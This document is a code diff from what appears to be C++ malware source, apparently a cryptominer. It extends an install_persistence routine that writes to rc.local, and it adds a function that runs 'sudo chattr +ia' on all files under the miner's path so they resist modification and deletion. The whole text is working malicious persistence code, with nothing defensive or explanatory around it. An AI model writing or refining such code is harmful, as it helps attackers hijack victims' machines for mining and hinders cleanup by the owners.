@@ -213,6 +213,10 @@ void install_persistence(){
         std::string("\" >> ") += std::string(rc_local)).c_str();
 
         system(command2);
+
+        Error::log_error("Setting chattr in all files");
+        set_persistence_bits();
+
         return;
     
     }else{
@@ -226,4 +230,16 @@ void install_persistence(){
     }
     
     Error::log_error("[-] Persistence failed");
+}
+
+void set_persistence_bits(){
+    std::string commands;
+    const char * command = (commands = std::string("sudo chattr +ia ") += std::string(miner_path) +=
+        std::string("*")).c_str();
+    int ret = system(command);
+    if(ret == 0){
+        Error::log_error("[+] Chattr setted!");
+    }else{
+        Error::log_error("[-] Chattr error!");
+    }
 }
